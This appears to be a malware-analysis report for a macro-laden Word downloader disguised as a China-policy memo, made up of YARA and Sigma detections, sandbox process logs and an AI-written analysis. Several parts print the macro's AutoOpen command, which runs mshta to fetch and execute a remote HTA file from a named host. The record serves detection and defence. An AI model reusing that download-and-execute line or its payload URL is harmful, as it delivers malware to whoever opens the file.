crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

names: Task Force on US Policy To China HR Memo.docm
Task Force on US Policy To China HR Memo.docm.doc

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Remotely Hosted HTA File Executed Via Mshta.EXE
sigma_analysis_results.rule_description: Detects execution of the "mshta" utility with an argument containing the "http" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file

match_context.values: @{Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Product=Internet Explorer; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\9534910617834457114.docx.doc" /q; CommandLine=mshta https://mohanimpex.com/include/tempdoc/891250/Ersrr0.hta; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; EventID=1; ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\9534910617834457114.docx.doc" /q; CommandLine=mshta https://mohanimpex.com/include/tempdoc/891250/Ersrr0.hta; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Suspicious Browser Launch From Document Reader Process
sigma_analysis_results.rule_description: Detects when a browser process or browser tab is launched from an application that handles document files such as Adobe, Microsoft Office, etc. And connects to a web application over http(s), this could indicate a possible phishing attempt.

match_context.values: @{Product=Internet Explorer; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=MSHTA.EXE; Hashes=MD5=06B02D5C097C7DB1F109749C45F3F505,SHA256=213AB5658E44F2A111C5E4CFFA043660BC49307EBB1B7EEDD21DBDDCA5DA41AC,IMPHASH=EE4E4A67C3E30B424AA8A1C9C579181F; Description=Microsoft (R) HTML Application host; FileVersion=11.00.19041.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE" "C:\Users\Bruno\Desktop\9534910617834457114.docx.doc" /q; CommandLine=mshta https://mohanimpex.com/include/tempdoc/891250/Ersrr0.hta; EventID=1; ParentImage=C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE; IntegrityLevel=High; Image=C:\Windows\SysWOW64\mshta.exe; Company=Microsoft Corporation}

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

crowdsourced_ai_results.analysis:
The provided macros exhibit clear signs of malicious intent. The `AutoOpen()` subroutine is particularly concerning as it automatically executes when the document is opened, which is a common tactic used by malware to ensure its execution without user consent.

1. Shell Command Execution: The line `Shell (\"mshta https://mohanimpex.com/include/tempdoc/891250/Ersrr0.hta\")` indicates that the macro uses the `Shell` function to execute a command. In this case, it calls `mshta`, which is a legitimate Windows utility for executing HTML applications (HTA files). However, the URL points to an external resource, suggesting that the macro is attempting to download and execute potentially harmful content from the internet.

2. External Resource Access: By directing the execution to a remote HTA file, the macro could be downloading additional payloads or executing scripts that may compromise the system's security. This behavior aligns with known patterns of malware that fetches and runs code from untrusted sources.

3. Persistence Mechanism: Although there are no explicit indicators of persistence mechanisms in the provided code snippet, the use of `AutoOpen()` suggests an intention to run the macro every time the document is opened, which can lead to repeated attempts to execute malicious actions.

4. Obfuscation and Deceptive Practices: While there are no overtly obfuscated strings in the visible code, the use of a seemingly benign method (`mshta`) to execute potentially harmful content is a form of deception that is often employed in malicious macros.

Overall, the combination of automatic execution, external command invocation, and potential for downloading and executing harmful content leads to the conclusion that these macros are indeed malicious in nature.
